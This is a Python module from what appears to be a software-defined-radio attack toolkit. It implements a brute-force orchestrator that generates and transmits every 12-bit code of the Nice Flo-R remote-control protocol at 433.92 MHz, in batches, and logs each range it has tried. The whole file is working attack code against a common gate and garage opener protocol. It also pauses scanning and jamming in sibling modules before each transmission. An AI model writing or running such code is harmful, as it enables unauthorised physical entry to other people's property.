"""
Brute-Force Orchestrator
Iterates through 12-bit address space (0-4095) for Nice Flo-R protocol.
Manages batching, hardware locking, and feedback/logging.
"""

import time
import os
import logging
import json
import numpy as np
import tempfile
from typing import Optional, Callable
from concurrent.futures import ThreadPoolExecutor

from .sdr_controller import SDRController, SDRState
from .ook_packet_builder import build_batch, save_to_cs16
from .protocol_spec import get_protocol
from .subghz_scanner import SubGHzScanner

logger = logging.getLogger("BruteForce")

class BruteForceOrchestrator:
    def __init__(self, sdr: SDRController, scanner: Optional[SubGHzScanner] = None):
        self.sdr = sdr
        self.scanner = scanner
        self.is_running = False
        self.stop_requested = False
        
        # Attack Parameters
        self.freq_hz = 433.92e6
        self.sample_rate = 2e6
        self.batch_size = 100
        self.guard_time_us = 3000
        
        # Logging
        self.log_file = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            "captures", "subghz", "captured_codes.jsonl"
        )
        
    def stop(self):
        """Stop the attack"""
        self.stop_requested = True
        logger.info("Stopping Brute-Force attack...")

    def start_attack(self, start_code: int = 0, end_code: int = 4095):
        """
        Start the brute-force attack sequence.
        iterates from start_code to end_code (inclusive).
        """
        if self.is_running:
            logger.warning("Attack already running")
            return
            
        self.is_running = True
        self.stop_requested = False
        logger.info(f"Starting Brute-Force: {start_code} -> {end_code}")
        
        # Ensure SDR is ready
        if not self.sdr.is_open:
            if not self.sdr.open():
                logger.error("Failed to open SDR")
                self.is_running = False
                return

        try:
            # Main Loop
            current = start_code
            while current <= end_code and not self.stop_requested:
                
                # 1. Prepare Batch
                batch_end = min(current + self.batch_size, end_code + 1)
                codes_int = range(current, batch_end)
                codes_bin = [f"{c:012b}" for c in codes_int] # 12-bit binary strings
                
                logger.info(f"Preparing batch: {current} - {batch_end-1} ({len(codes_bin)} codes)")
                
                # 2. Generate Signal Batch using robust builder
                spec = get_protocol("nice_flor")
                batch_samples = build_batch(
                    codes=codes_bin,
                    spec=spec,
                    sample_rate=self.sample_rate
                )
                
                # 3. Save to Temp File
                with tempfile.NamedTemporaryFile(suffix=".cs16", delete=False) as tmp:
                    tmp_filename = tmp.name
                    
                save_to_cs16(batch_samples, tmp_filename)
                
                # 4. Transmit (Critical Section)
                # We must ensure scanner is paused if running
                scanner_was_running = False
                if self.scanner and self.scanner.running:
                    scanner_was_running = True
                    self.scanner.stop() # Or pause if implemented
                    time.sleep(0.5) # Allow cleanup
                
                # Stop any jamming or RX
                # Ensure we are in a clean state for TX
                if self.sdr.device.state == SDRState.RX_RUNNING:
                     self.sdr.stop(requester="bruteforce")
                     time.sleep(0.1)
                
                self.sdr.stop_jamming(requester="bruteforce")
                
                # Transmit
                logger.info("Transmitting batch...")
                success = self.sdr.transmit_file(
                    filepath=tmp_filename,
                    freq=self.freq_hz,
                    sample_rate=self.sample_rate,
                    requester="bruteforce"
                )
                
                # Cleanup temp file
                if os.path.exists(tmp_filename):
                    os.remove(tmp_filename)
                
                if not success:
                    logger.error("Failed to transmit batch")
                    break
                    
                # 5. Log Progress
                self._log_attempts(codes_int)
                
                # 6. Feedback / Recovery
                if scanner_was_running and self.scanner:
                    # Briefly re-enable scanner to check for "Open" signal?
                    # For now just continue or restore state at end
                    # self.scanner.start() 
                    pass
                
                current = batch_end
                
                # 7. Safety Pause
                time.sleep(0.1) 
                
        except Exception as e:
            logger.error(f"Brute-Force Exception: {e}")
            
        finally:
            self.is_running = False
            logger.info("Brute-Force Finished/Stopped")
            # Restore scanner if it was running?
            
    def _log_attempts(self, codes):
        """Log attempted codes to JSONL"""
        try:
            os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
            with open(self.log_file, "a") as f:
                entry = {
                    "timestamp": time.time(),
                    "attack_type": "brute_force_nice_flor",
                    "code_range_start": codes[0],
                    "code_range_end": codes[-1],
                    "count": len(codes)
                }
                f.write(json.dumps(entry) + "\n")
        except Exception as e:
            logger.error(f"Logging failed: {e}")
